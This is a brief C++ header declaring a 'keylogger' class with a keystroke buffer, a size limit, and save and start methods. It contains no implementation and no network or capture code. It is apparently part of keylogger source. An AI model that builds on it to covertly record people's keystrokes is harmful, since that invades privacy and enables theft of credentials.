#ifndef _KEYLOGGER_HPP_
#define _KEYLOGGER_HPP_

using namespace std;

class keylogger
{
    public :
		string* a_buffer;
		int a_buffer_maximum_size;

		keylogger();

		virtual ~keylogger();

		virtual void save();

		virtual void start();
};

#endif
